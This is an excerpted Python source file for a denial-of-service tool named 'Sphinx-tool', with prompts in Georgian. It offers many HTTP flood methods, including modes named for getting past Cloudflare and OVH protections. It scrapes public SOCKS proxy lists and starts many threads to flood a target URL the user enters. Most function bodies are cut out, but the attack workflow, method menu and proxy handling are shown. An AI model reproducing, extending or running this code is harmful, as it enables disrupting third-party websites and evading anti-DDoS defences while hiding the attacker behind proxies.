...
def build_threads(mode,thread_num,event,socks_type,ind_rlock):
	if mode == "post":
		...
		for _ in range(thread_num):
			th = threading.Thread(target = tls,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "rand":
		for _ in range(thread_num):
			th = threading.Thread(target = rand,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()				
	elif mode == "head":
		for _ in range(thread_num):
		...
		for _ in range(thread_num):
			th = threading.Thread(target = cfb,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "cfbuam":
		for _ in range(thread_num):
			th = threading.Thread(target = cfbuam,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "dgb":
		for _ in range(thread_num):
			th = threading.Thread(target = dgb,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "ovh":
		for _ in range(thread_num):
			th = threading.Thread(target = ovh,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()						
	elif mode == "get":
		for _ in range(thread_num):
			th = threading.Thread(target = get,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "httpsfloods":
		for _ in range(thread_num):
			th = threading.Thread(target = httpsfloods,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "fullbypass":
		for _ in range(thread_num):
			th = threading.Thread(target = fullbypass,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()		
	elif mode == "jsbypass":
		for _ in range(thread_num):
			th = threading.Thread(target = jsbypass,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "cfkills":
		for _ in range(thread_num):
			th = threading.Thread(target = cfkills,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "httpsocket":
		for _ in range(thread_num):
			th = threading.Thread(target = httpsocket,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "storm":
		for _ in range(thread_num):
			th = threading.Thread(target = storm,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()				
	elif mode == "browser":
		for _ in range(thread_num):
			th = threading.Thread(target = browser,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()															
...
def CheckerOption():
	global proxies
	N = str(input("> გნებავთ მიიღოთ პროქსის socks სია?(y/n,ავტომატურად მითითებულია=y):"))
	if N == 'y' or N == "" :
	...
	if choice == "4":
		...
		out_file = str(input("> Socks5 პროქსის ფაილი(ჩაწერეთ socks5.txt):"))
		if out_file == '':
	...
	if len(proxies) == 0:
		...
		sys.exit(1)
	print ("> რაოდენობა Socks%s პროქსის %s" %(choice,len(proxies)))
	time.sleep(0.03)
	ans = str(input("> გსურთ შეამოწმოთ პროქსის სია მუშაობს თუ არა?(y/n, ავტომატურად მითითებულია=y):"))
	if ans == "":
		ans = "y"
	if ans == "y":
		ms = str(input("> ნაკადის დაგვიანება socks(წამი, ავტომატურად მითითებულია=5):"))
		if ms == "":
			ms = int(5)
		else :
			try:
...
def OutputToScreen(ind_rlock):
	...
	while 1:
		...
		for k,v in ind_dict.items():
			...
			ind_dict[k] = 0
		ind_rlock.release()
		print("{:^70}".format(" ["+sp_char[i]+"] Sphinx-tool| Total Rps:"+str(total)))
		i+=1
		time.sleep(1)
		print("\n"*100)

			
def get(event,socks_type,ind_rlock):
	global ind_dict
...
def storm(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def tls(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def rand(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def browser(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def jsbypass(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def cfkills(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def httpsfloods(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def fullbypass(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def httpsocket(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
...
def check_socks(ms):
	...
	for lines in list(proxies):
		...
		time.sleep(0.01)
		sys.stdout.write("> შემოწმდა "+str(nums)+" პროქსი\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> შემოწმდა "+str(nums)+" პროქსი\r")
		sys.stdout.flush()
	print("\r\n> შემოწმდა ყველა პროქსი, სულ მუშაობს:"+str(len(proxies)))
	ans = input("> გსურთ მათი შენახვა ფაილში? (y/n, ავტომატურად მითითებულია=y)")
	if ans == "y" or ans == "":
		if choice == "4":
			...
			fp.close()
			print("> პროქსი შენახულია socks4.txt.")
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("> პროქსი შენახულია socks5.txt.")
			
def check_list(socks_file):
	print("> შემოწმების სია")
...
def downloadsocks(choice):
	if choice == "4":
		...
		try:
			...
			pass
		print("> უკვე ჩამოტვირთებულია socks4 სია, როგორც socks4.txt ით")
	if choice == "5":
		...
		try:
			...
			pass
		try:
			r = requests.get("https://api.openproxylist.xyz/socks5.txt",timeout=5)
			f.write(r.content)
		except:
			pass	
		try:
		...
		try:
			...
			pass
		try:
			r = requests.get("https://www.freeproxy.world/?type=socks5",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://spys.one/en/socks-proxy-list",timeout=5)
			f.write(r.content)
		except:
			pass			
		try:
			...
			pass
		try:
			r = requests.get("https://github.com/roosterkid/openproxylist/blob/main/SOCKS5_RAW.txt",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://github.com/ItzRazvyy/ProxyList/blob/main/socks5.txt",timeout=5)
			f.write(r.content)
		except:
			pass		
		try:
		...
		try:
			...
			f.close()
		print("> უკვე ჩამოტვირთებულია socks5 სია, როგორც socks5.txt ით")
...
def main():
	...
	global brute
	global url
	print("> მეთოდები: (L7= GET/STORM/FULLBYPASS/HTTPSFLOODS/HTTPSOCKET/Browser/TLS/RAND/CFB/CFBUAM/CFKILLS/JSBYPASS/DGB/OVH/POST/HEAD/SLOW/CHECK)")
	mode = InputOption("> აირჩიეთ რომელიმე მეთოდი (ავტომატურად მითითებულია=TLS) :",["get","tls","storm","fullbypass","rand","jsbypass","httpsfloods","httpsocket","browser","cfb","cfbuam","cfkills","dgb","ovh","post","head","slow","check"],"TLS")
	url = str(input("> შეიყვანეთ სამიზნე ლინკი:")).strip()
	
	ParseUrl(url)
	if mode == "post":
		mode2 = InputOption("> გსურთ ქუქის მორგება? (y/n, ავტომატურად მითითებულია=n):",["y","n","yes","no"],"n")
		if mode2 == "y":
			data = open(str(input("> შეყვანეთ ფაილის მიმართულება:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
	choice2 = InputOption("> გსურთ ქუქის მორგება? (y/n, ავტომატურად მითითებულია=n):",["y","n","yes","no"],"n")
	if choice2 == "y":
		cookies = str(input("გთხოვთ შეიყვანოთ cookies:")).strip()
	choice = InputOption("> აირჩიეთ socks mode(4/5, ავტომატურად მითითებულია=5):",["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	if mode == "check":
		CheckerOption()
		print("> პროცესის დასასრული")
		return
	if mode == "slow":	
		thread_num = str(input("> დაკავშირება(ავტომატურად მითითებულია=400):"))
	else:
	...
	if thread_num == "":
		...
		try:
			...
			sys.exit("შეცდომა ნაკადის ციფრები")
	CheckerOption()
	if len(proxies) == 0:
		print("> პროქსი აღარა მიუწდომელი გთხოვთ გადმოიწეროთ ხელახლა.")
		return
	ind_rlock = threading.RLock()
	if mode == "slow":
		input("დაჭირეთ ენთერს რათა განაგრძოთ.")
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		multiple = str(input("> ჩაწერეთ გადიდება(ავტომატურად მითითებულია=100):"))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		brute = str(input("> სისწრაფის რეჟიმის ჩართვა[ბეტა](y/n, ავტომატურად მითითებულია=n):"))
		if brute == "":
			brute = False
		elif brute == "y":
			brute = True
		...
		event.clear()
		input("დაჭირე ძმა ენთერს თორე მეც მომეტყვნა ტვინი :D :D .")
		event.set()
